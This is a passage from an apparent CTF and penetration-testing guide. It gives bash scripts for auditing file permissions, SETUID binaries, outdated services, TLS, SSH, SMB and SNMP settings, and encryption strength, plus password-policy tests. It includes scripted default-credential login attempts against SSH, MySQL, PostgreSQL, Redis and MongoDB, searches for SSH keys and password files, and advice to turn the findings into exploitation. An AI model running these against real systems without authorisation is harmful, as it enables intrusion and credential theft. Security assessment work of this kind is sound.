echo "[+] World-readable sensitive files:" >> $OUTPUT
find /etc -type f -perm -004 2>/dev/null >> $OUTPUT
find /root -type f -perm -004 2>/dev/null >> $OUTPUT
find /home -type f -perm -004 2>/dev/null >> $OUTPUT

# World-writable files (potential code injection)
echo "" >> $OUTPUT
echo "[+] World-writable files:" >> $OUTPUT
find / -type f -perm -002 2>/dev/null | grep -v "/proc\|/sys" | head -20 >> $OUTPUT

# SETUID binaries
echo "" >> $OUTPUT
echo "[+] SETUID binaries (privilege escalation risk):" >> $OUTPUT
find / -perm -4000 2>/dev/null >> $OUTPUT

# Weak SSH permissions
echo "" >> $OUTPUT
echo "[+] SSH configuration and key permissions:" >> $OUTPUT
find / -name "authorized_keys" -o -name "id_rsa" 2>/dev/null | while read file; do
  ls -la "$file" >> $OUTPUT
done

cat $OUTPUT
```

**Context-specific applications:**

- **Post-exploitation privilege escalation:** Identifies vectors for system compromise escalation
- **Data exfiltration identification:** Reveals unprotected sensitive files
- **Compliance violation detection:** Identifies permission configurations violating security standards
- **Lateral movement planning:** Determines how compromised accounts can access other resources

**Example CTF scenario:**

```bash
# Quick permission vulnerability check
echo "[*] Scanning for permission weaknesses..."

# World-writable files in web directories
find /var/www -perm -002 2>/dev/null

# SETUID binaries that may enable privilege escalation
find / -perm -4000 2>/dev/null | grep -E "vim|less|curl|wget|tar|zip"

# SSH keys with weak permissions
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null | xargs ls -la

# Database configs readable by non-root
ls -la /etc/mysql/my.cnf /etc/postgresql/*/main/postgresql.conf 2>/dev/null
```

---

### Outdated/Unpatched Services

Outdated services frequently contain known vulnerabilities remediable through patches. Version detection combined with CVE database correlation identifies exploitable services.

**Service version detection and comparison:**

```bash
# Enumerate service versions
nmap -sV -p 22,80,443,3306,5432 192.168.1.100

# Output analysis example:
# 22/tcp    open  ssh       OpenSSH 7.4    (vulnerable: CVE-2018-15473)
# 80/tcp    open  http      Apache 2.4.6   (unpatched: 2.4.6 released 2012)
# 3306/tcp  open  mysql     MySQL 5.5.46   (vulnerable: multiple RCE CVEs)
```

**OS version and patch level detection:**

```bash
# Linux OS version detection
nmap -O 192.168.1.100

# Manual OS version checks (if access obtained)
cat /etc/os-release
cat /etc/lsb-release
lsb_release -a

# Kernel version
uname -a
uname -r

# Installed packages and versions
dpkg -l | grep -E "mysql|apache|openssh|openssl"  # Debian/Ubuntu
rpm -qa | grep -E "mysql|apache|openssh|openssl"  # RedHat/CentOS
```

**Windows patch level assessment:**

```bash
# Windows version
systeminfo | findstr /C:"OS"
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version

# Installed patches
wmic qfe list brief /format:table
Get-HotFix | Sort-Object InstalledOn

# Services not updated
Get-Service | Where-Object {$_.Status -eq 'Running'} | \
  ForEach-Object {Get-Command $_.Name -ErrorAction SilentlyContinue | Select-Object Version}
```

**CVE correlation and vulnerability lookup:**

```bash
# Manual CVE lookup from version information
# OpenSSH 7.4 known vulnerabilities:
# CVE-2018-15473 - Username enumeration
# CVE-2016-6210 - Username enumeration (timing-based)
# CVE-2018-20685 - Bypass of command restrictions

# MySQL 5.5.46 known vulnerabilities:
# CVE-2016-6664 - Privilege escalation
# CVE-2016-3477 - Authentication bypass
# CVE-2016-5629 - Remote code execution

# Apache 2.4.6 known vulnerabilities:
# CVE-2017-9798 - Use-after-free (Optionsbleed)
# CVE-2017-6094 - Denial of service
```

**Automated CVE database queries:**

```bash
# NVD (National Vulnerability Database) API query
curl -s "https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=OpenSSH" \
  | jq '.result.CVE_Items[] | {cve_id: .cve.CVE_data_meta.ID, description: .cve.description.description_data[0].value}'

# ExploitDB API query
curl -s "https://www.exploit-db.com/api/search?query=OpenSSH%207.4" | jq .

# Metasploit module availability check
msfconsole -q -x "search openssh 7.4" 2>/dev/null | grep exploit
```

**Patch status assessment workflow:**

```bash
#!/bin/bash
# Comprehensive outdated service identification

TARGET="192.168.1.100"
OUTPUT="patch_assessment.txt"

echo "[*] Patch Level Assessment for $TARGET" > $OUTPUT

# Step 1: Enumerate service versions
echo "[+] Enumerating service versions..." >> $OUTPUT
nmap -sV -p- $TARGET -oX /tmp/versions.xml 2>/dev/null

# Parse versions and compare against current releases
# This requires manual CVE database maintenance or API integration
OPENSSH_VERSION=$(grep -oP 'OpenSSH_\K[0-9.]+' /tmp/versions.xml | head -1)
APACHE_VERSION=$(grep -oP 'Apache[/_]\K[0-9.]+' /tmp/versions.xml | head -1)
MYSQL_VERSION=$(grep -oP 'MySQL\s+\K[0-9.]+' /tmp/versions.xml | head -1)

echo "[+] Detected versions:" >> $OUTPUT
echo "    OpenSSH: $OPENSSH_VERSION" >> $OUTPUT
echo "    Apache: $APACHE_VERSION" >> $OUTPUT
echo "    MySQL: $MYSQL_VERSION" >> $OUTPUT

# Step 2: Cross-reference with known vulnerabilities
echo "" >> $OUTPUT
echo "[+] Known vulnerabilities:" >> $OUTPUT

# Check OpenSSH version against known CVEs
if [[ "$OPENSSH_VERSION" =~ ^7\.[0-4] ]]; then
  echo "    OpenSSH $OPENSSH_VERSION: CVE-2018-15473 (username enumeration)" >> $OUTPUT
fi

if [[ "$OPENSSH_VERSION" =~ ^[6-7]\. ]]; then
  echo "    OpenSSH $OPENSSH_VERSION: Multiple SSH protocol vulnerabilities" >> $OUTPUT
fi

# Check Apache version
if [[ "$APACHE_VERSION" =~ ^2\.4\.[0-6] ]]; then
  echo "    Apache $APACHE_VERSION: Multiple DoS and information disclosure CVEs" >> $OUTPUT
fi

cat $OUTPUT
```

**Security update checking (if credentials available):**

```bash
# Linux update availability
apt list --upgradable                   # Debian/Ubuntu
yum list updates                        # RedHat/CentOS
pacman -Qu                             # Arch Linux

# Check for security-specific updates
apt list --upgradable | grep security
yum list updates --security

# Force update without applying (assessment only)
apt-get update && apt list --upgradable
```

**Vulnerability exploitation based on version:**

```bash
# Map detected versions to Metasploit modules
nmap -sV --script smb-vuln-* -p 139,445 192.168.1.100      # SMB vulnerabilities
nmap -sV --script ssh-* -p 22 192.168.1.100                # SSH vulnerabilities
nmap -sV --script http-* -p 80,443 192.168.1.100           # HTTP vulnerabilities
nmap -sV --script mysql-* -p 3306 192.168.1.100            # MySQL vulnerabilities
```

**Context-specific applications:**

- **Vulnerability prioritization:** Older versions typically contain more exploitable vulnerabilities
- **Patch management validation:** Verifies whether systems receive security updates
- **Compliance verification:** Identifies systems not meeting update policies
- **CTF progression:** Outdated services often intentionally vulnerable to guide challenge difficulty

**Example CTF scenario:**

```bash
# Rapid service version assessment
nmap -sV 192.168.1.100 -oN service_versions.txt

# Extract version strings for CVE lookup
grep -oE '(OpenSSH|Apache|MySQL|PostgreSQL)_[0-9.]+' service_versions.txt

# Check for known exploits
nmap --script vuln -p 22,80,3306 192.168.1.100

# Metasploit module targeting
msfconsole -q -x "search OpenSSH 7.4; search Apache 2.4.6"
```

---

### Misconfigured Protocols

Protocols can be configured insecurely through disabled encryption, weak cipher suites, or overly permissive settings. Protocol analysis reveals configuration weaknesses enabling interception or downgrade attacks.

**SSL/TLS configuration assessment:**

```bash
# SSL/TLS version detection
nmap --script ssl-enum-ciphers -p 443 192.168.1.100

# OpenSSL connection analysis
openssl s_client -connect 192.168.1.100:443 -v

# Output analysis reveals:
# - SSL/TLS protocol version (SSLv2, SSLv3, TLSv1.0, TLSv1.2, TLSv1.3)
# - Supported cipher suites
# - Certificate information
# - Key exchange algorithms

# TestSSL.sh comprehensive assessment
testssl.sh 192.168.1.100:443

# Output flags weak configurations:
# [WEAK] SSLv3 detected
# [WEAK] TLSv1.0 detected
# [WEAK] RC4 cipher detected
# [CRITICAL] Self-signed certificate
```

**Weak SSL/TLS indicators:**

```bash
# Check for deprecated protocols (SSLv2, SSLv3)
openssl s_client -connect 192.168.1.100:443 -ssl2 2>/dev/null
openssl s_client -connect 192.168.1.100:443 -ssl3 2>/dev/null

# Connection succeeds = vulnerability exists

# Check for weak ciphers
openssl s_client -connect 192.168.1.100:443 -cipher 'DES:RC4:MD5' 2>/dev/null

# Identify supported protocol versions

nmap -sV --script ssl-enum-ciphers --script-args ssl.version=sslv3 -p 443 192.168.1.100

````

**SSH protocol configuration assessment:**

```bash
# SSH protocol version detection
ssh -v 192.168.1.100 2>&1 | grep -i "protocol version"

# SSH-1.99 indicates legacy SSH v1 support (vulnerable)
# SSH-2.0 indicates SSH v2 only (correct)

# Detailed SSH configuration analysis
nmap --script ssh2-enum-algos -p 22 192.168.1.100

# Output analysis:
# - Key exchange algorithms
# - Encryption algorithms
# - MAC (Message Authentication Code) algorithms
# - Compression algorithms

# Identify weak algorithms
ssh-audit 192.168.1.100:22 | grep -i "weak\|deprecated\|fail"
````

**FTP/Telnet plaintext protocol detection:**

```bash
# Detect FTP (unencrypted credentials)
nmap -p 21 192.168.1.100 --script ftp-banner

# FTP presence indicates plaintext credential transmission risk

# Detect Telnet (unencrypted everything)
nmap -p 23 192.168.1.100 --script telnet-encryption

# Both should be replaced with SFTP and SSH respectively
```

**HTTP/HTTPS configuration analysis:**

```bash
# Check for HTTP (plaintext) with sensitive data
curl -I http://192.168.1.100

# Verify HTTPS enforcement
curl -I http://192.168.1.100 | grep -i "Location: https"
# If redirects to HTTPS: secure configuration
# If no redirect: potential man-in-the-middle vulnerability

# Check security headers
curl -I https://192.168.1.100 -k | grep -i "Strict-Transport-Security\|Content-Security-Policy\|X-Frame-Options"

# Missing headers = weak configuration

# HTTP methods allowed (check for PUT/DELETE)
curl -I -X OPTIONS https://192.168.1.100 -k | grep -i "Allow"

# If PUT/DELETE allowed: potential file upload/modification vulnerability
```

**SNMP protocol security assessment:**

```bash
# SNMPv1/v2c use plaintext community strings
snmpwalk -c public 192.168.1.100 1.3.6.1.2.1.1

# If successful: insecure SNMP configuration

# Check SNMP version and security
nmap -sU -p 161 --script snmp-info 192.168.1.100

# Indicators of weak configuration:
# - SNMPv1 or SNMPv2c (no encryption)
# - Default community strings (public, private)
# - Writable community strings (set operations allowed)

# SNMP v3 (encrypted) check
snmpwalk -v 3 -u snmpuser 192.168.1.100
# Requires authentication; more secure
```

**DNS protocol configuration:**

```bash
# Check for DNS zone transfer (should be restricted)
dig @ns1.example.com example.com AXFR

# Successful transfer = misconfiguration
# Failed transfer = properly configured

# Check DNSSEC implementation
dig example.com +dnssec | grep -i "ad\|rrsig"

# Missing DNSSEC = vulnerable to DNS hijacking

# DNS amplification attack vulnerability (if exposed)
dig @192.168.1.100 . ANY +short

# Responds to ANY queries = potential amplification attack source
```

**SMB/CIFS protocol assessment:**

```bash
# Check for SMBv1 (deprecated, vulnerable)
nmap -p 139,445 --script smb-protocols 192.168.1.100

# Output shows SMB versions supported
# SMBv1 presence = multiple critical vulnerabilities (EternalBlue, etc.)

# Check SMB signing requirement
nmap -p 445 --script smb2-security-mode 192.168.1.100

# If "signing required: false" = vulnerable to relay attacks

# Check for guest access
nmap -p 445 --script smb-enum-shares 192.168.1.100

# Accessible shares without credentials = information disclosure risk
```

**LDAP/Active Directory protocol assessment:**

```bash
# Check for LDAP encryption (StartTLS)
nmap -p 389,636 192.168.1.100

# Port 389 = unencrypted LDAP
# Port 636 = encrypted LDAPS (preferred)

# Check LDAP anonymous bind (should be disabled)
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com"

# Successful connection without credentials = anonymous bind enabled

# Enumerate LDAP configuration (information disclosure)
ldapsearch -h 192.168.1.100 -x -b "cn=config" objectClass=*
```

**VPN/IPsec protocol assessment:**

```bash
# Detect IPsec/IKE (UDP 500)
nmap -sU -p 500 192.168.1.100

# Check IKE version and encryption algorithms
ike-scan -M 192.168.1.100

# Weak algorithms (DES, MD5) indicate misconfiguration

# Check for VPN service exposure
nmap -p 500,1194,1723,500 192.168.1.100

# Open VPN ports = potential VPN concentration point for exploitation
```

**Protocol misconfiguration assessment workflow:**

```bash
#!/bin/bash
# Comprehensive protocol security assessment

TARGET="192.168.1.100"
OUTPUT="protocol_assessment.txt"

echo "[*] Protocol Security Assessment for $TARGET"
echo "" > $OUTPUT

# SSL/TLS assessment
echo "[+] SSL/TLS Configuration:" >> $OUTPUT
testssl.sh --json $TARGET:443 2>/dev/null | jq '.[] | select(.severity == "HIGH" or .severity == "CRITICAL")' >> $OUTPUT

# SSH assessment
echo "" >> $OUTPUT
echo "[+] SSH Configuration:" >> $OUTPUT
ssh-audit $TARGET:22 2>/dev/null | grep -i "weak\|deprecated\|fail" >> $OUTPUT

# SMB assessment
echo "" >> $OUTPUT
echo "[+] SMB Configuration:" >> $OUTPUT
nmap -p 445 --script smb-protocols $TARGET 2>/dev/null >> $OUTPUT

# HTTP headers
echo "" >> $OUTPUT
echo "[+] HTTP Security Headers:" >> $OUTPUT
curl -s -I http://$TARGET 2>/dev/null >> $OUTPUT
curl -s -I https://$TARGET -k 2>/dev/null >> $OUTPUT

# DNS security
echo "" >> $OUTPUT
echo "[+] DNS Configuration:" >> $OUTPUT
dig @$TARGET . ANY +short 2>/dev/null | head -5 >> $OUTPUT

echo "[+] Assessment complete: $OUTPUT"
cat $OUTPUT
```

**Context-specific applications:**

- **Interception vulnerability identification:** Plaintext protocols vulnerable to man-in-the-middle attacks
- **Downgrade attack assessment:** Weak protocol version support enables forced downgrade to weaker standards
- **Encryption strength validation:** Weak ciphers potentially breakable with computational resources
- **Compliance violation detection:** Deprecated protocols violate security standards (PCI-DSS, HIPAA, etc.)

**Example CTF scenario:**

```bash
# Rapid protocol weakness assessment
echo "[*] Checking protocol configurations..."

# SSL/TLS weakness
openssl s_client -connect 192.168.1.100:443 -v 2>&1 | grep -E "protocol|cipher"

# SSH weak algorithms
ssh-audit 192.168.1.100:22 | grep -i "weak\|deprecated"

# HTTP plaintext data
curl -I http://192.168.1.100 | grep -i "Location: https" || echo "[-] HTTP not redirecting to HTTPS"

# SMBv1 detection
nmap -p 445 --script smb-protocols 192.168.1.100 | grep -i "smb1\|v1"

# SNMP plaintext
snmpwalk -c public 192.168.1.100 1.3.6.1.2.1.1 2>/dev/null | head -5 && echo "[+] SNMP publicly accessible"
```

---

### Weak Encryption Settings

Weak encryption implementations, inadequate key lengths, or deprecated algorithms create cryptographic vulnerabilities enabling data decryption or brute-force attacks.

**Cryptographic algorithm assessment:**

```bash
# Enumerate cipher suites (SSL/TLS)
nmap --script ssl-enum-ciphers -p 443 192.168.1.100

# Output analysis for weak ciphers:
# [WEAK] DES (56-bit) - Brute-forceable
# [WEAK] RC4 - Stream cipher vulnerabilities
# [WEAK] MD5 - Hash collision vulnerabilities
# [WEAK] SHA1 - Preimage attack feasibility
# [STRONG] AES-256-GCM - Modern, secure
# [STRONG] CHACHA20-POLY1305 - Modern, secure
```

**Key length assessment:**

```bash
# TLS certificate key size
openssl s_client -connect 192.168.1.100:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -i "public key bits"

# Output indicates RSA key size:
# RSA 1024 bits = WEAK (easily factorizable)
# RSA 2048 bits = ADEQUATE (current minimum)
# RSA 4096 bits = STRONG (recommended)

# ECDSA key size
openssl s_client -connect 192.168.1.100:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -i "EC PRIVATE KEY\|NIST"

# ECDSA 256-bit (P-256) = ~128-bit security equivalent
# ECDSA 384-bit (P-384) = ~192-bit security equivalent
```

**Hash algorithm weakness:**

```bash
# Check certificate hash algorithm
openssl s_client -connect 192.168.1.100:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -i "signature algorithm"

# sha256WithRSAEncryption = secure
# sha1WithRSAEncryption = WEAK (SHA1 collision attacks demonstrated)
# md5WithRSAEncryption = CRITICAL (MD5 collision attacks practical)

# Check SSH key algorithms
ssh -v 192.168.1.100 2>&1 | grep -i "server host key type"

# ssh-rsa = acceptable (RSA signing)
# ecdsa-sha2-nistp256 = good (ECDSA)
# ssh-ed25519 = excellent (modern curve)
```

**SSH encryption algorithm analysis:**

```bash
# Detailed SSH algorithm enumeration
ssh -Q cipher 192.168.1.100          # Query available ciphers

# Sample output:
# aes128-ctr - STRONG
# aes256-ctr - STRONG
# aes128-gcm@openssh.com - STRONG (authenticated encryption)
# arcfour - WEAK (RC4-based)
# 3des-cbc - WEAK (56-bit equivalent)

# Check actual negotiated cipher
ssh -v -c aes256-ctr 192.168.1.100 2>&1 | grep "cipher"
```

**Database encryption assessment:**

```bash
# MySQL encryption settings
mysql -h 192.168.1.100 -u root -p -e "SHOW VARIABLES LIKE '%ssl%';"

# Weak output:
# have_ssl = NO (no encryption support)
# ssl_version = TLSv1.0 (outdated)

# Strong output:
# have_ssl = YES
# ssl_version = TLSv1.2, TLSv1.3

# PostgreSQL encryption
psql -h 192.168.1.100 -U postgres -c "SHOW ssl;"
# on = encrypted connections supported
# off = plaintext only

# Check cipher preference
psql -h 192.168.1.100 -U postgres -c "SHOW ssl_ciphers;"
```

**Weak randomness/entropy assessment:**

```bash
# Check system entropy (if access obtained)
cat /proc/sys/kernel/random/entropy_avail

# Value < 1000 = potentially weak random number generation
# This affects cryptographic key generation quality

# Check entropy sources
ls -la /dev/urandom /dev/random

# Test cryptographic randomness (entropy estimation)
dd if=/dev/urandom bs=1M count=1 2>/dev/null | ent
# Output shows entropy bits per byte
# Close to 8.0 = good randomness
# Below 7.0 = weak randomness
```

**VPN/IPsec encryption audit:**

```bash
# Check IKE encryption algorithms
ike-scan -M 192.168.1.100

# Output shows algorithms used:
# DES = WEAK
# 3DES = WEAK
# AES-128 = ADEQUATE
# AES-256 = STRONG

# Check Phase 1 encryption
ike-scan --aggressive 192.168.1.100 2>/dev/null | grep -i "encryption"

# Check Phase 2 (IPsec) algorithms
racoon -t 192.168.1.100 2>/dev/null  # If accessible
```

**Wireless encryption assessment (if applicable):**

```bash
# Check WiFi encryption standard
iwconfig                    # Interface information

# WEP = CRITICALLY WEAK (breakable in minutes)
# WPA = WEAK (dictionary attacks possible)
# WPA2 = ADEQUATE (AES encryption)
# WPA3 = STRONG (modern standard)

# Check cipher suite
nmcli device wifi show 192.168.1.100 | grep -i "encryption"
```

**Encryption strength workflow:**

```bash
#!/bin/bash
# Comprehensive encryption assessment

TARGET="192.168.1.100"
OUTPUT="encryption_audit.txt"

echo "[*] Cryptographic Strength Assessment"
echo "" > $OUTPUT

# TLS Certificate Analysis
echo "[+] TLS Certificate Encryption Strength:" >> $OUTPUT
echo "" >> $OUTPUT

CERT_INFO=$(openssl s_client -connect $TARGET:443 </dev/null 2>/dev/null | openssl x509 -noout -text)

# Key size
echo "Certificate Key Size:" >> $OUTPUT
echo "$CERT_INFO" | grep -i "public key" >> $OUTPUT

# Signature algorithm
echo "Signature Algorithm:" >> $OUTPUT
echo "$CERT_INFO" | grep -i "signature algorithm" >> $OUTPUT

# Hash algorithm
echo "Hash Algorithm:" >> $OUTPUT
echo "$CERT_INFO" | grep -i "sha\|md5" >> $OUTPUT

# SSH Algorithm Analysis
echo "" >> $OUTPUT
echo "[+] SSH Encryption Algorithms:" >> $OUTPUT
ssh-audit $TARGET:22 2>/dev/null | grep -E "encryption|aes|des|rc4|weak" >> $OUTPUT

# Database Encryption
echo "" >> $OUTPUT
echo "[+] Database Encryption Configuration:" >> $OUTPUT
mysql -h $TARGET -u root -p'' -e "SHOW VARIABLES LIKE '%ssl%';" 2>/dev/null >> $OUTPUT

# IPsec/VPN Analysis
echo "" >> $OUTPUT
echo "[+] IPsec/VPN Encryption:" >> $OUTPUT
ike-scan -M $TARGET 2>/dev/null >> $OUTPUT

# Recommendations
echo "" >> $OUTPUT
echo "[+] Recommendations:" >> $OUTPUT
echo "" >> $OUTPUT
if grep -q "sha1\|md5\|DES\|RC4" $OUTPUT; then
  echo "[!] WEAK ENCRYPTION DETECTED - Immediate remediation required" >> $OUTPUT
fi
if grep -q "RSA 1024" $OUTPUT; then
  echo "[!] WEAK KEY SIZE (RSA 1024) - Update to RSA 2048 or higher" >> $OUTPUT
fi
if grep -q "SSLv3\|TLSv1.0" $OUTPUT; then
  echo "[!] DEPRECATED PROTOCOL - Update to TLSv1.2 or TLSv1.3" >> $OUTPUT
fi

cat $OUTPUT
```

**Brute-force feasibility against weak encryption:**

```bash
# Estimate DES brute-force time
# DES: 56-bit key space = 2^56 combinations
# Modern GPU: ~10^11 operations/second
# Time estimate: 2^56 / 10^11 ≈ 2 seconds (practical attack)

# MD5 hash collision
# MD5 collision attacks demonstrated (Wang et al., 2004)
# Practical collision generation tools available
# md5crack, hashcat support efficient MD5 reversal

# RC4 stream cipher cryptanalysis
# Multiple academic attacks documented
# Biclique and VMPC attacks practical with significant computational resources
```

**Context-specific applications:**

- **Data confidentiality assessment:** Determines if encrypted data remains protected
- **Key derivation strength:** Weak KDF (Key Derivation Functions) enable password cracking
- **Forward secrecy validation:** Perfect forward secrecy (PFS) verification ensures session key independence
- **Long-term security posture:** Modern encryption standards ensure resilience against future attacks

**Example CTF scenario:**

```bash
# Quick encryption weakness assessment
echo "[*] Checking encryption strength..."

# Certificate key size
openssl s_client -connect 192.168.1.100:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep "Public-Key"

# Weak cipher detection
nmap --script ssl-enum-ciphers -p 443 192.168.1.100 | grep -i "weak\|deprecated"

# SSH weak algorithms
ssh-audit 192.168.1.100:22 | grep -i "\[fail\]\|\[weak\]"

# Hash algorithm weakness
openssl s_client -connect 192.168.1.100:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -i "sha1\|md5"

# Database encryption
mysql -h 192.168.1.100 -u root -p'' -e "SHOW VARIABLES LIKE 'have_ssl';" 2>/dev/null
```

---

### Integrated Configuration Weakness Assessment

**End-to-end configuration vulnerability identification combining all techniques:**

```bash
#!/bin/bash
# Comprehensive configuration weakness assessment

TARGET="192.168.1.100"
ASSESSMENT_DIR="config_assessment_$(date +%s)"
mkdir -p "$ASSESSMENT_DIR"

echo "[*] COMPREHENSIVE CONFIGURATION WEAKNESS ASSESSMENT"
echo "[*] Target: $TARGET"
echo "[*] Output Directory: $ASSESSMENT_DIR"
echo ""

# Phase 1: Service enumeration
echo "[+] Phase 1: Service and Version Detection"
nmap -sV -p- $TARGET -oN "$ASSESSMENT_DIR/services.txt" 2>/dev/null

# Phase 2: Default credential testing
echo "[+] Phase 2: Default Credential Assessment"
cat > "$ASSESSMENT_DIR/default_creds_test.sh" << 'SCRIPT'
#!/bin/bash
TARGET=$1
OUTPUT=$2

# SSH
sshpass -p "password" ssh -o ConnectTimeout=2 root@$TARGET "id" 2>/dev/null && \
  echo "[+] SSH root:password" >> $OUTPUT

sshpass -p "" ssh -o ConnectTimeout=2 root@$TARGET "id" 2>/dev/null && \
  echo "[+] SSH root:(empty)" >> $OUTPUT

# MySQL
mysql -h $TARGET -u root -p'' -e "SELECT 1;" 2>/dev/null && \
  echo "[+] MySQL root:(empty)" >> $OUTPUT

mysql -h $TARGET -u root -ppassword -e "SELECT 1;" 2>/dev/null && \
  echo "[+] MySQL root:password" >> $OUTPUT

# PostgreSQL
PGPASSWORD='' psql -h $TARGET -U postgres -c "SELECT 1;" 2>/dev/null && \
  echo "[+] PostgreSQL postgres:(empty)" >> $OUTPUT

# Redis
redis-cli -h $TARGET PING 2>/dev/null | grep -q PONG && \
  echo "[+] Redis: Unauthenticated access" >> $OUTPUT

# MongoDB
mongo $TARGET --eval "db.adminCommand('ping')" 2>/dev/null && \
  echo "[+] MongoDB: Unauthenticated access" >> $OUTPUT
SCRIPT

chmod +x "$ASSESSMENT_DIR/default_creds_test.sh"
bash "$ASSESSMENT_DIR/default_creds_test.sh" $TARGET "$ASSESSMENT_DIR/default_creds.txt"

# Phase 3: Permission assessment
echo "[+] Phase 3: Permission Vulnerability Assessment"
if [ -n "$(nmap -p 22 $TARGET --script ssh-auth-methods 2>/dev/null | grep -i accepted)" ]; then
  echo "[*] SSH access detected - performing local permission audit"
  ssh root@$TARGET "find / -perm -004 -name '*password*' 2>/dev/null" > "$ASSESSMENT_DIR/world_readable_files.txt" 2>/dev/null
fi

# Phase 4: Unnecessary service detection
echo "[+] Phase 4: Unnecessary Service Analysis"
grep "open" "$ASSESSMENT_DIR/services.txt" | awk '{print $1}' | cut -d'/' -f1 | while read port; do
  SERVICE=$(grep "^$port/" "$ASSESSMENT_DIR/services.txt" | awk '{print $3}')
  # Flag unexpected services
  if [[ ! "$SERVICE" =~ (ssh|http|https) ]]; then
    echo "[!] Unexpected service on port $port: $SERVICE" >> "$ASSESSMENT_DIR/unnecessary_services.txt"
  fi
done

# Phase 5: Protocol security assessment
echo "[+] Phase 5: Protocol Security Configuration"
nmap --script ssl-enum-ciphers -p 443 $TARGET 2>/dev/null >> "$ASSESSMENT_DIR/ssl_config.txt"
ssh-audit $TARGET:22 2>/dev/null >> "$ASSESSMENT_DIR/ssh_config.txt"
nmap -p 445 --script smb-protocols $TARGET 2>/dev/null >> "$ASSESSMENT_DIR/smb_config.txt"

# Phase 6: Encryption strength
echo "[+] Phase 6: Encryption Strength Assessment"
openssl s_client -connect $TARGET:443 </dev/null 2>/dev/null | \
  openssl x509 -noout -text | grep -E "Public-Key|Signature|sha1|md5" >> "$ASSESSMENT_DIR/encryption_strength.txt" 2>/dev/null

# Phase 7: Generate summary report
echo "[+] Phase 7: Generating Summary Report"
cat > "$ASSESSMENT_DIR/CONFIGURATION_ASSESSMENT_REPORT.txt" << EOF
================================================================================
CONFIGURATION WEAKNESS ASSESSMENT REPORT
================================================================================
Assessment Date: $(date)
Target: $TARGET

EXECUTIVE SUMMARY
================================================================================
This assessment identified configuration weaknesses across multiple attack
vectors including default credentials, unnecessary services, weak permissions,
and cryptographic vulnerabilities.

FINDINGS
================================================================================

1. CREDENTIAL VULNERABILITIES
$(if [ -f "$ASSESSMENT_DIR/default_creds.txt" ]; then cat "$ASSESSMENT_DIR/default_creds.txt"; else echo "No default credentials detected"; fi)

2. UNNECESSARY SERVICES
$(if [ -f "$ASSESSMENT_DIR/unnecessary_services.txt" ]; then cat "$ASSESSMENT_DIR/unnecessary_services.txt"; else echo "Standard services only"; fi)

3. SERVICE VERSIONS
$(head -20 "$ASSESSMENT_DIR/services.txt" | grep open)

4. PROTOCOL SECURITY
$(if [ -f "$ASSESSMENT_DIR/ssl_config.txt" ]; then grep -i "weak\|deprecated" "$ASSESSMENT_DIR/ssl_config.txt"; fi)

5. ENCRYPTION STRENGTH
$(if [ -f "$ASSESSMENT_DIR/encryption_strength.txt" ]; then cat "$ASSESSMENT_DIR/encryption_strength.txt"; fi)

RISK PRIORITIZATION
================================================================================
CRITICAL (Immediate Action Required):
- Default credentials enabling authentication bypass
- Services with known RCE vulnerabilities
- Plaintext protocols (Telnet, FTP)

HIGH (Urgent):
- Outdated/unpatched services
- Weak encryption (DES, RC4, MD5)
- Deprecated protocols (SSLv3, TLSv1.0)

MEDIUM (Important):
- Unnecessary services expanding attack surface
- Weak file permissions
- Weak key sizes (RSA 1024)

RECOMMENDATIONS
================================================================================
1. Change all default credentials immediately
2. Disable unnecessary services and close unused ports
3. Update all services to current stable versions
4. Enforce strong encryption (AES-256, TLSv1.2+, RSA 2048+)
5. Implement least-privilege access controls
6. Enable security headers and encryption enforcement

================================================================================
EOF

echo ""
echo "[+] Assessment Complete!"
echo "[+] Report: $ASSESSMENT_DIR/CONFIGURATION_ASSESSMENT_REPORT.txt"
echo ""
cat "$ASSESSMENT_DIR/CONFIGURATION_ASSESSMENT_REPORT.txt"
```

**Context-specific applications:**

- **Comprehensive hardening baseline:** Identifies all configuration weaknesses requiring remediation
- **Risk quantification:** Prioritizes vulnerabilities by exploitability and impact
- **Compliance validation:** Ensures configuration meets security standards
- **CTF progression planning:** Maps configuration weaknesses to exploitation strategy

**Example CTF end-to-end execution:**

```bash
# Complete configuration assessment
bash comprehensive_config_assessment.sh 192.168.1.100

# Results in organized directory with:
# - services.txt: All running services and versions
# - default_creds.txt: Successfully verified default credentials
# - unnecessary_services.txt: Services not typically required
# - ssl_config.txt: TLS/SSL vulnerabilities
# - CONFIGURATION_ASSESSMENT_REPORT.txt: Executive summary

# Use findings to guide exploitation:
# - Default creds → immediate system access
# - Outdated services → known CVE exploitation
# - Weak encryption → interception/brute-force attacks
```

This comprehensive approach systematically identifies configuration weaknesses across multiple attack vectors, enabling prioritized and efficient exploitation within CTF environments.

---

## Authentication Mechanism Analysis

### Password Policy Weaknesses

Password policy weaknesses allow attackers to exploit inadequate authentication controls through predictable patterns, weak requirements, or insufficient security measures.

**Password Policy Testing - Information Gathering:**

```bash
# Test account creation to identify policy requirements
# Registration page analysis:
# - Minimum/maximum length
# - Character requirements (uppercase, lowercase, numbers, special)
# - Password history enforcement
# - Common password blacklist
# - Password expiration settings

# Example manual testing
curl -X POST http://target.com/register \
  -d "username=testuser&password=test&confirm=test" \
  -v | grep -i "password"

# Look for error messages revealing policy:
# "Password must be at least 8 characters"
# "Password must contain uppercase letter"
# "Password too common"
```

**Password Complexity Testing:**

```bash
# Test weak password acceptance
# Minimum complexity tests:
test
123456
password
abc123
admin
qwerty

# Pattern-based tests:
username123 (username + numbers)
Company2024 (company name + year)
Winter2024! (season + year + special char)

# Test with curl
curl -X POST http://target.com/register \
  -d "username=testuser&password=password" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Test password length limits
python3 -c "print('a'*1)" # Minimum length test
python3 -c "print('a'*4)" # Common minimum
python3 -c "print('a'*8)" # Standard minimum
python3 -c "print('a'*1000)" # Maximum length test
```

**Common Password Pattern Testing:**

```bash
# Create pattern-based wordlist
cat > password_patterns.txt <<EOF
admin
admin123
Admin123
Admin@123
password
Password1
Password@1
Welcome1
Welcome@123
CompanyName123
Spring2024
Summer2024
EOF

# Test with Hydra
